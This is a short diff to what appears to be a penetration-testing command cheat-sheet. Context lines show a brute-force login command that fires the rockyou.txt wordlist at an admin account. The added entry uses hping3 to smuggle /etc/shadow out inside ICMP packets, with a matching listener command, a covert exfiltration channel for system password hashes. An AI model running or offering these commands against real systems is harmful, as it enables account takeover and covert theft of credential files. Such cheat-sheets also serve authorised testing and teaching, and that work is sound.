@@ -569,3 +569,9 @@ for python;
 [Json Brute Force]
 python3 jsonbrute.py --url http://management.test.local/api/login --wordlist rockyou.txt --data "username=admin, password=FUZZ, recaptcha= " --code 200 --verbose
 #https://github.com/Jake-Ruston/JSONBrute
+
+[hping3 file transfer8]
+# sender
+/usr/sbin/hping3 -1 127.0.0.1 -e signature -E /etc/shadow -d 500
+# listener
+/usr/sbin/hping3 -1 127.0.0.1 -9 signature -I lo
